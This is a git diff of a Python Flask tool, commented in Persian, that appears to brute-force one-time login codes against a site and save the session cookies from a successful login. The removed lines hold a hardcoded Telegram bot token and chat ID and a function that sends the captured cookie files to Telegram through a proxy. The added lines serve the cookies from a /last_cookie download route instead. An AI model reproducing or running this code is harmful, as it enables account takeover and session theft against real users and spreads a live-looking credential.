@@ -4,15 +4,11 @@ from http.cookiejar import MozillaCookieJar
 from concurrent.futures import ThreadPoolExecutor
 import time
 import sys
-from flask import Flask, render_template_string, request, jsonify
+from flask import Flask, render_template_string, request, jsonify, send_file
 from flask_socketio import SocketIO, emit
 import threading
 import os
 from datetime import datetime
-
-# تنظیمات تلگرام
-TELEGRAM_BOT_TOKEN = "5858689331:AAH3pdfEDVSIF9AaPsWCGQiZzltgkKVtKr8"
-TELEGRAM_CHAT_ID = "-1002021960039"
 
 app = Flask(__name__)
 socketio = SocketIO(app)
@@ -27,33 +23,11 @@ current_status = {
     "processed": 0,
     "error": None
 }
+last_cookie_file = None  # برای ذخیره مسیر آخرین فایل کوکی
 
-def send_file_to_telegram(file_path, retries=3):
-    """ارسال فایل به تلگرام با تلاش مجدد در صورت خطا"""
-    url = f"https://go.tensha.ir/proxy/https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendDocument"
-    for attempt in range(retries):
-        try:
-            if not os.path.exists(file_path):
-                progress_log.append(f"Error: File {file_path} does not exist!")
-                print(f"Error: File {file_path} does not exist!")  # لاگ به ترمینال
-                return False
-            with open(file_path, 'rb') as file:
-                files = {'document': file}
-                data = {'chat_id': TELEGRAM_CHAT_ID}
-                response = requests.post(url, data=data, files=files, timeout=10)
-                response.raise_for_status()
-                progress_log.append(f"File {file_path} sent to Telegram successfully!")
-                print(f"File {file_path} sent to Telegram successfully!")  # لاگ به ترمینال
-                return True
-        except (requests.exceptions.RequestException, FileNotFoundError) as e:
-            progress_log.append(f"Failed to send {file_path} to Telegram (attempt {attempt + 1}/{retries}): {str(e)}")
-            print(f"Failed to send {file_path} to Telegram (attempt {attempt + 1}/{retries}): {str(e)}")  # لاگ به ترمینال
-            if attempt < retries - 1:
-                time.sleep(2)
-    return False
-
-def save_and_send_cookies(cookies, code_str):
-    """تابع زنده برای ذخیره و ارسال کوکی‌ها"""
+def save_cookies(cookies, code_str):
+    """ذخیره کوکی‌ها و برگردوندن لینک"""
+    global last_cookie_file
     timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
     cookies_file = f"cookies_success_{code_str}_{timestamp}.txt"
     
@@ -65,16 +39,15 @@ def save_and_send_cookies(cookies, code_str):
     if os.path.exists(cookies_file) and os.path.getsize(cookies_file) > 0:
         progress_log.append(f"Cookies saved in {cookies_file}")
         print(f"Cookies saved in {cookies_file}")  # لاگ به ترمینال
-        success = send_file_to_telegram(cookies_file)
-        if not success:
-            progress_log.append(f"Critical: Failed to send cookies {cookies_file} to Telegram after retries!")
-            print(f"Critical: Failed to send cookies {cookies_file} to Telegram after retries!")  # لاگ به ترمینال
+        last_cookie_file = cookies_file  # ذخیره مسیر آخرین فایل کوکی
+        return True
     else:
         progress_log.append(f"Error: Failed to save cookies to {cookies_file}")
         print(f"Error: Failed to save cookies to {cookies_file}")  # لاگ به ترمینال
+        return False
 
 def send_request(host, login_otp_nonce, mobile, code_values, counter, max_retries=5):
-    global current_status
+    global current_status, last_cookie_file
     headers = {
         "Host": host,
         "Sec-Ch-Ua-Platform": "\"Windows\"",
@@ -121,15 +94,15 @@ def send_request(host, login_otp_nonce, mobile, code_values, counter, max_retrie
                            f"Redirect to: {json_response['data']['redirect']}")
                     progress_log.append(msg)
                     print(msg)  # لاگ به ترمینال
-                    save_and_send_cookies(response.cookies, code_str)
+                    save_cookies(response.cookies, code_str)
                     timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
                     output_file = f"success_{code_str}_{timestamp}.txt"
+                    cookie_link = f"http://{request.host}/last_cookie"  # لینک به آخرین کوکی
                     with open(output_file, 'w', encoding='utf-8') as f:
-                        f.write(msg + f"\nCookies file: cookies_success_{code_str}_{timestamp}.txt\n")
-                    progress_log.append(f"Output saved in {output_file}")
-                    print(f"Output saved in {output_file}")  # لاگ به ترمینال
-                    send_file_to_telegram(output_file)
-                    current_status["error"] = "Success found!"
+                        f.write(msg + f"\nLast cookie file: {cookie_link}\n")
+                    progress_log.append(f"Success found! Output saved in {output_file}. Last cookie: {cookie_link}")
+                    print(f"Success found! Output saved in {output_file}. Last cookie: {cookie_link}")  # لاگ به ترمینال
+                    current_status["error"] = f"Success found! Last cookie: {cookie_link}"
                     return True
                 else:
                     progress_log.append(f"Failed with code {code_str} (number {counter}): {json_response}")
@@ -249,6 +222,15 @@ def stop():
 def status():
     """برگشت وضعیت فعلی ورکر"""
     return jsonify(current_status)
+
+@app.route('/last_cookie', methods=['GET'])
+def last_cookie():
+    """نمایش یا دانلود آخرین فایل کوکی"""
+    global last_cookie_file
+    if last_cookie_file and os.path.exists(last_cookie_file):
+        return send_file(last_cookie_file, as_attachment=True, download_name=os.path.basename(last_cookie_file))
+    else:
+        return "No successful cookie found yet!", 404
 
 if __name__ == '__main__':
     socketio.run(app, host='0.0.0.0', port=5000, debug=True)
